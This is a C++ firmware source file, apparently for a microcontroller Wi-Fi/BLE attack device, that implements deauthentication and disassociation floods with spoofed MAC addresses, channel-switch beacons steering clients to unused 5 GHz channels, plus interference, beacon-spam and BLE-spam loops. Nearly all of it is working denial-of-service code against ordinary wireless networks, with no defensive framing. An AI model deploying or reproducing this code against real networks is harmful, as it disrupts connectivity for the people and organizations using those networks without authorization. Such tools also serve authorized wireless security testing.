#include "attack_runner.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "wifi_conf.h"
#include "../../debug.h"
#include "../config/app_config.h"
#include "../core/led_controller.h"
#include "../ble/ble_manager.h"
#include "../interference/interference.h"
#include "../oled/oled_display.h"
#include "../packet-injection/packet-injection.h"
#include "../security/security_utils.h"
#include "../spammer/spammer.h"
#include "../wifi/wifi_scanner.h"

std::map<int, std::vector<int>> g_deauth_channels;

static const uint8_t kCsaGhostChannels[] = {36, 40, 44, 48, 149, 153, 157, 161};
static uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void attackPrepareStaRadio() {
    wifi_off();
    delay(100);
    int on_ret = wifi_on(RTW_MODE_STA);
    delay(150);
    wifi_disable_powersave();
    DEBUG_SER_PRINT("[TX] STA radio ready: on=");
    DEBUG_SER_PRINT(on_ret);
    DEBUG_SER_PRINT(" running=");
    DEBUG_SER_PRINTLN((int)rltk_wlan_running(0));
}

static uint32_t _sendDeauthPulseForTarget(uint8_t* bssid, const char* ssid, bool is_5g,
                                          uint16_t reason, uint32_t& mac_seq, size_t& csa_idx,
                                          uint32_t* fail_count) {
    mac_seq++;
    uint8_t rand_mac[6] = {
        0x02,
        (uint8_t)(mac_seq >> 24),
        (uint8_t)(mac_seq >> 16),
        (uint8_t)(mac_seq >> 8),
        (uint8_t)mac_seq,
        0xAA
    };

    uint32_t sent = 0;
    uint32_t failed = 0;
    auto track = [&](bool ok) {
        if (ok) sent++;
        else failed++;
    };

    if (is_5g) {
        track(wifi_tx_deauth_nav(bssid, kBcastMac, reason));
        uint8_t ghost_ch = kCsaGhostChannels[csa_idx % sizeof(kCsaGhostChannels)];
        csa_idx++;
        track(wifi_tx_beacon_csa_frame(bssid, kBcastMac, ssid, ghost_ch));
        track(wifi_tx_beacon_csa_frame(bssid, kBcastMac, ssid, ghost_ch));
    }

    track(wifi_tx_deauth_frame(bssid, kBcastMac, reason));
    track(wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid));
    track(wifi_tx_disassoc_frame(bssid, kBcastMac, reason));
    track(wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid));
    track(wifi_tx_null_frame(bssid, kBcastMac));
    track(wifi_tx_auth_frame(rand_mac, bssid));
    track(wifi_tx_beacon_frame(bssid, kBcastMac, ssid));
    track(wifi_tx_deauth_frame(bssid, kBcastMac, reason));
    track(wifi_tx_auth_frame(rand_mac, bssid));

    if (fail_count) *fail_count += failed;
    return sent;
}

static void _runDeauthLoop() {
    std::vector<int> target_channels;
    target_channels.reserve(g_deauth_channels.size());
    for (const auto& entry : g_deauth_channels) {
        if (!is5GhzChannel(entry.first)) target_channels.push_back(entry.first);
    }
    for (const auto& entry : g_deauth_channels) {
        if (is5GhzChannel(entry.first)) target_channels.push_back(entry.first);
    }

    if (target_channels.empty()) {
        g_app.attack_mode = AttackMode::IDLE;
        return;
    }

    int last_ch = -1;
    uint32_t fast_mac_counter = 0;
    size_t csa_ghost_idx = 0;
    const uint16_t reasons[] = {g_app.config.deauth_reason, 8, 1, 4, 6, 7};
    const int total_targets = (int)g_deauth_channels.size();
    uint32_t fail_frames = 0;
    uint32_t last_led_ms = millis();
    uint32_t last_log_ms = last_led_ms;

    DEBUG_SER_PRINT("[TX] Starting DEAUTH loop: channels=");
    DEBUG_SER_PRINT((unsigned long)target_channels.size());
    DEBUG_SER_PRINT(" pulses=");
    DEBUG_SER_PRINTLN(g_app.config.frames_per_deauth);

    oled_attack_start();
    g_app.channel_needs_restore = true;
    ledSetBlue(true);

    while (g_app.attack_mode == AttackMode::DEAUTH) {
        for (int ch : target_channels) {
            if (ch != last_ch) {
                int ch_ret = wext_set_channel(WLAN0_NAME, ch);
                if (ch_ret < 0) {
                    DEBUG_SER_PRINT("[TX] WARN: wext_set_channel failed ch=");
                    DEBUG_SER_PRINT(ch);
                    DEBUG_SER_PRINT(" ret=");
                    DEBUG_SER_PRINTLN(ch_ret);
                }
                if (last_ch >= 0 && ((last_ch <= 14 && ch > 14) || (last_ch > 14 && ch <= 14))) {
                    delay(BAND_SWITCH_DELAY_MS);
                } else {
                    delay(SAME_BAND_DELAY_MS);
                }
                last_ch = ch;
            }

            if (g_deauth_channels.count(ch)) {
                const bool is_5g = is5GhzChannel(ch);
                const int pulses = g_app.config.frames_per_deauth;
                const std::vector<int>& indices = g_deauth_channels[ch];

                for (int i = 0; i < pulses; i++) {
                    uint16_t reason = reasons[i % (sizeof(reasons) / sizeof(reasons[0]))];
                    for (int idx : indices) {
                        if (idx < 0 || (size_t)idx >= g_scan_results.size()) continue;
                        WiFiScanResult& ap = g_scan_results[(size_t)idx];
                        g_app.sent_frames += _sendDeauthPulseForTarget(
                            ap.bssid, ap.ssid.c_str(), is_5g, reason, fast_mac_counter, csa_ghost_idx, &fail_frames);
                    }
                    uint32_t now = millis();
                    if ((uint32_t)(now - last_led_ms) >= 150U) {
                        ledToggleBlue();
                        last_led_ms = now;
                    }
                    if ((uint32_t)(now - last_log_ms) >= 1000U) {
                        DEBUG_SER_PRINT("[TX] DEAUTH ch=");
                        DEBUG_SER_PRINT(ch);
                        DEBUG_SER_PRINT(" sent=");
                        DEBUG_SER_PRINT((unsigned long)g_app.sent_frames);
                        DEBUG_SER_PRINT(" fail=");
                        DEBUG_SER_PRINTLN((unsigned long)fail_frames);
                        last_log_ms = now;
                    }
                    if ((i & 3) == 3) {
                        oled_show_deauth(total_targets, g_app.sent_frames);
                    }
                    delay(1);
                }
            }
            oled_show_deauth(total_targets, g_app.sent_frames);
        }
        delay(1);
    }
    ledSetBlue(false);
}

static void _runInterferenceLoop(WiFiServer& server) {
    oled_attack_start();
    g_app.channel_needs_restore = true;
    uint32_t last_log_ms = millis();
    DEBUG_SER_PRINT("[TX] Starting INTERFERENCE loop: state=");
    DEBUG_SER_PRINTLN((int)get_interference_state());

    while (g_app.attack_mode == AttackMode::INTERFERENCE) {
        g_app.sent_frames += run_interference_cycle();
        oled_show_interference(get_active_target_count(), MAX_INTERFERENCE_TARGETS);
        uint32_t now = millis();
        if ((uint32_t)(now - last_log_ms) >= 1000U) {
            DEBUG_SER_PRINT("[TX] INT state=");
            DEBUG_SER_PRINT((int)get_interference_state());
            DEBUG_SER_PRINT(" active=");
            DEBUG_SER_PRINT(get_active_target_count());
            DEBUG_SER_PRINT(" sent=");
            DEBUG_SER_PRINTLN((unsigned long)g_app.sent_frames);
            last_log_ms = now;
        }
        if (get_interference_state() == INT_STATE_IDLE) {
            DEBUG_SER_PRINTLN("[TX] INT stopped -> restoring SoftAP");
            stop_interference();
            g_app.attack_mode = AttackMode::IDLE;
            wifiRestoreSoftAp(g_app.config.current_channel);
            server.begin();
            int c24 = 0, c5g = 0;
            wifiScanCountByBand(&c24, &c5g);
            oled_show_idle(c24, c5g);
            break;
        }
        delay(1);
    }
}

static void _runSpamLoop() {
    oled_attack_start();
    g_app.channel_needs_restore = true;
    const int ssid_count = (int)Spammer.getNetworkCount();
    uint32_t last_led_ms = millis();
    uint32_t last_log_ms = last_led_ms;

    DEBUG_SER_PRINT("[TX] Starting BEACON_SPAM loop: ssids=");
    DEBUG_SER_PRINTLN(ssid_count);
    ledSetBlue(true);

    while (g_app.attack_mode == AttackMode::BEACON_SPAM) {
        uint32_t sent = Spammer.run();
        g_app.sent_frames += sent;
        uint32_t now = millis();
        if (sent > 0 && (uint32_t)(now - last_led_ms) >= 150U) {
            ledToggleBlue();
            last_led_ms = now;
        }
        if ((uint32_t)(now - last_log_ms) >= 1000U) {
            DEBUG_SER_PRINT("[TX] SPAM sent=");
            DEBUG_SER_PRINTLN((unsigned long)g_app.sent_frames);
            last_log_ms = now;
        }
        oled_show_spammer(ssid_count);
    }
    ledSetBlue(false);
}

void attackRunTick(WiFiServer& server) {
    switch (g_app.attack_mode) {
        case AttackMode::BLE_SPAM:
            bleRunSpamLoop(g_app.config.ble_spam_type);
            break;
        case AttackMode::DEAUTH:
            ledShowAttackOff();
            _runDeauthLoop();
            break;
        case AttackMode::INTERFERENCE:
            ledShowAttackOff();
            _runInterferenceLoop(server);
            break;
        case AttackMode::BEACON_SPAM:
            ledShowAttackOff();
            _runSpamLoop();
            break;
        case AttackMode::IDLE:
        default:
            break;
    }
}
